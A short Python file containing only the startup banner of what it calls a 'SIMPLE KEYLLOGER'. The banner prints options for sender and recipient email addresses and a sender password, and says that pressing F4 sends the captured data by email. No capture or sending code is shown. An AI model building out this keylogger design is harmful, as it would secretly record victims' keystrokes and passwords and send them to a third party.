import time

def header():
    x = "||||||||||||||||||||||||||"

    print(x)
    print("     SIMPLE KEYLLOGER")
    print(x)
    time.sleep(1)

    print(" --from - sender email")
    print(" --to - recipient email")
    print(" --pass - sender password")
    print(x)
    time.sleep(1)
    print(" > press 'F4' to receive\n the data by email\n")
    print(" > press 'ESC' to close")
    print(x)
    
    print('loading...')